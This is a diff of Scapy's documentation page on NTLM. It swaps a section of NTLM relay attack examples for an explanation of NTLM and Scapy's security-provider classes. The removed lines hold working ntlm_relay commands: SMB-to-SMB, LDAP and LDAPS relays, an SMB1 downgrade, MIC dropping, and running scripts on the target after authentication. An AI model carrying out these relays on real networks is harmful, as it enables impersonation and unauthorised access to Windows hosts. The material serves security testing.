@@ -2,127 +2,34 @@ NTLM
 ====
 
 Scapy provides dissection & build methods for NTLM and other Windows mechanisms.
-In particular, the ``ntlm_relay`` command allows to perform some NTLM relaying attacks.
+
+How NTLM works
+--------------
+
+NTLM is a legacy method of authentication that uses a `challenge-response mechanism <https://en.wikipedia.org/wiki/Challenge%E2%80%93response_authentication>`_.
+The goal is to:
+
+- verify the identity of the client
+- negotiate a common session key between the client and server
 
 .. note::
 
-    Read `this article from hackndo <https://en.hackndo.com/ntlm-relay/>`_ to understand how NTLM relay work and what we are trying to achieve here.
+    We won't get in more details. You can read more in `this article from hackndo <https://en.hackndo.com/ntlm-relay/>`_ to understand how NTLM works.
 
-Examples
---------
+NTLM in Scapy
+-------------
 
+Scapy implements `Security Providers <https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture>`_ trying to stay as close a what you would find in the Windows world.
 
-**Requirement: Answer to all netbios requests with the local IP**
+Basically those are classes that implement two functions:
 
-.. code::
+- ``GSS_Init_sec_context``: called by the client, passing it a ``Context`` and optionally a token
+- ``GSS_Accept_sec_context``: called by the server, passing it a ``Context`` and optionally a token
 
-    netbios_announce(iface="virbr0")
+They both return the updated Context, a token to optionally send to the server/client and a GSSAPI status code.
 
-SMB <-> SMB: SMB relay with force downgrade to SMB1
-___________________________________________________
+For NTLM, this is implemented in the :class:`~scapy.layers.ntlm.NTLMSSP`.
+You can typically use it in :class:`~scapy.layers.smbclient.SMB_Client`, :class:`~scapy.layers.smbserver.SMB_Server`, :class:`~scapy.layers.msrpce.rpcclient.DCERPC_Client` or :class:`~scapy.layers.msrpce.rpcserver.DCERPC_Server`.
+Have a look at `SMB <smb.html>`_ and `DCE/RPC <dcerpc.html>`_ to get examples on how to use it.
 
-.. note::
-
-    ``server_kwargs={"REAL_HOSTNAME":"WIN1"}`` is compulsory on SMB1 if the name that you are spoofing is different from the real name. Set this to avoid getting a ``STATUS_DUPLICATE_NAME``
-
-.. code::
-
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"REAL_HOSTNAME":"WIN1"})
-
-.. image:: ../graphics/ntlm/ntlmrelay_smb.png
-   :align: center
-
-.. image:: ../graphics/ntlm/ntlmrelay_smb_win1.png
-   :align: center
-
-.. image:: ../graphics/ntlm/ntlmrelay_smb_wireshark.png
-   :align: center
-
-.. image:: ../graphics/ntlm/ntlmrelay_smb_win2.png
-   :align: center
-
-
-SMB <-> SMB: Perform a SMB2 relay - default
-___________________________________________
-
-.. code::
-
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0")
-
-.. warning::
-
-    The legitimate client will the validity of the negotiated flags by using a signed IOCTL ``FSCTL_VALIDATE_NEGOTIATE_INFO`` which we cannot fake, therefore losing the connection.
-    We however still have created an authenticated illegitimate client to the server, where we won't be performing that check, that we can use. See the case right below.
-
-SMB <-> SMB: Perform a SMB2 relay - scripted
-____________________________________________
-
-Because of the note above, we now close the legitimate client & run commands on the server directly.
-
-.. note::
-
-    Setting ``ECHO`` to ``False`` on the server instantly terminates the connection once Authentication is successful.
-    We set ``RUN_SCRIPT`` to ``True`` to run a script (in ``DO_RUN_SCRIPT`` in the automaton) once Authentication is successful. Note that ``REAL_HOSTNAME`` is required in this case.
-
-.. code::
-
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", server_kwargs={"ECHO": False}, client_kwargs={"REAL_HOSTNAME": "WIN1", "RUN_SCRIPT": True})
-
-.. image:: ../graphics/ntlm/ntlmrelay_smb2.png
-   :align: center
-
-SMB <-> SMB: SMB relay with force downgrade to SMB1 & drop NEGOEX
-_________________________________________________________________
-
-This example points out that the NEGOEX messages are optional: dropping them has no effect on the SMB1 connection.
-
-.. code::
-
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"PASS_NEGOEX": False, "REAL_HOSTNAME":"WIN1"})
-
-SMB <-> SMB: SMB relay with force downgrade to SMB1 & drop extended security
-____________________________________________________________________________
-
-This probably won't work. SMB1 clients abort unextended connections these days.
-
-.. code::
-
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"REAL_HOSTNAME":"WIN1"}, DROP_EXTENDED_SECURITY=True)
-
-SMB2 <-> LDAP: relay SMB's NTLM to an LDAP server
-_________________________________________________
-
-.. note::
-
-    Negotiating LDAP using SMB's credentials does work, but sets the ``SIGN`` field during the NTLM exchange. This causes LDAP to require signing. Read `the HackNDo article <https://en.hackndo.com/ntlm-relay/>` for more info.
-
-.. code::
-
-    load_layer("ldap")
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0")
-
-.. image:: ../graphics/ntlm/ntlmrelay_ldap.png
-   :align: center
-
-Let's try using DROP-THE-MIC-v1 or DROP-THE-MIC-v2:
-
-.. code::
-
-    load_layer("ldap")
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0", DROP_MIC_v1=True)
-
-.. code::
-
-    load_layer("ldap")
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0", DROP_MIC_v2=True)
-
-SMB2 <-> LDAPS: relay SMB's NTLM to an LDAPS server
-___________________________________________________
-
-.. code::
-
-    load_layer("ldap")
-    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAPS_Client, iface="virbr0")
-
-.. image:: ../graphics/ntlm/ntlmrelay_ldaps.png
-   :align: center
+.. note:: Remember that you can wrap it in a :class:`~scapy.layers.spnego.SPNEGOSSP`
